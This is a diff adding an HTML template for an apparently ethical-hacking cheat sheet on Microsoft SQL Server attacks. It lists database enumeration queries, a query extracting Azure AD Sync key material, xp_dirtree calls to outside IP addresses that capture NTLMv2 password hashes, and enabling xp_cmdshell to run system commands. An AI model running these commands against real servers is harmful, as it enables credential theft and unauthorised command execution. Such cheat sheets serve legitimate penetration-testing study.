@@ -1,0 +1,40 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Basic Usage</h1>
+    <h2 class="blue">Show databases</h2>
+    <div class="code-box"><pre><code>SQL> SELECT name FROM master.sys.databases</code></pre></div>
+    <h2 class="blue">Use database</h2>
+    <div class="code-box"><pre><code>SQL> use volume</code></pre></div>
+    <h2 class="blue">Show tables</h2>
+    <div class="code-box"><pre><code>SQL> SELECT name FROM sysobjects WHERE xtype = 'U'</code></pre></div>
+
+    <h1>Query with PowerShell</h1>
+    <div class="code-box"><pre><code>sqlcmd -S MONTEVERDE(HOST name of the machine) -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"</code></pre></div>
+    <h1>※MSSQL connection with PowerShell</h1>
+    <div class="code-box"><pre><code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=SSPI;"</code></pre></div>
+
+
+<h1>Privilege Enumeration and Exploitation</h1>
+<h2 class="blue">List privileges</h2>
+<div class="code-box"><pre><code>SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');</code></pre></div>
+
+<h2 class="blue">Send request and get NTLMv2 hash</h2>
+<div class="code-box"><pre><code>SQL> xp_dirtree '\\10.10.14.14\a';</code></pre></div>
+<div class="code-box"><pre><code>SQL> EXEC MASTER.sys.xp_dirtree '\\10.10.16.38\test', 1, 1</code></pre></div>
+
+<h2 class="blue">Run command</h2>
+<div class="code-box"><pre><code>SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami</code></pre></div>
+
+
+
+</body>
+</html>
